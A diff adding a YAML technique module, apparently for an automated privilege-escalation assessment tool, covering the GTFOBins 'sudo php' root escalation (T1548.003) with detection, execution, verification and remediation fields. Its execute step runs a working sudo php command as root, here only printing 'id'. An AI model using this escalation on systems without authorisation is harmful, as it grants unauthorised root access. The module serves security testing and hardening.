@@ -1,0 +1,25 @@
+# Sudo → root via php (GTFOBins)
+technique: T1548.003
+name: Sudo → root via php (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  sudo_allows: php
+execute:
+  command: |-
+    sudo php -r 'system("id");'
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_sudo
+  description: >
+    Sudo NOPASSWD on `php` allows arbitrary system() as root.
+  remediation: >
+    Drop `php` from sudoers.
+  refs: [T1548.003, GTFOBins/php]
